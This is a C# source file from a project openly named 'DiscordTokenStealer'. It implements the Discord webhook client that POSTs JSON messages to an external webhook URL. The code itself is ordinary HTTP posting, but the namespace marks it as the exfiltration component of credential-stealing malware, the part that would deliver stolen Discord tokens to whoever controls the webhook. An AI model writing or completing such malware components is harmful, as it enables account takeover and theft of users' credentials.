using System.Net.Http.Json;

namespace DiscordTokenStealer.Discord;

public partial class DiscordWebhookClient
{
    public async Task SendMessage(DiscordMessage message)
    {
        await SendAsync(HttpMethod.Post, JsonContent.Create(message));
    }
}

public partial class DiscordWebhookClient : IDisposable
{
    private readonly HttpClient _client;

    public DiscordWebhookClient(string uri)
    {
        _client = new HttpClient(new HttpClientHandler(), true)
        {
            BaseAddress = new Uri(uri)
        };
    }

    public void Dispose()
    {
        _client.Dispose();
        GC.SuppressFinalize(this);
    }

    private async Task SendAsync(HttpMethod method, HttpContent? content = null)
    {
        using var request = new HttpRequestMessage(method, string.Empty)
        {
            Content = content
        };
        using var response = await _client.SendAsync(request);
        response.EnsureSuccessStatusCode();
    }
}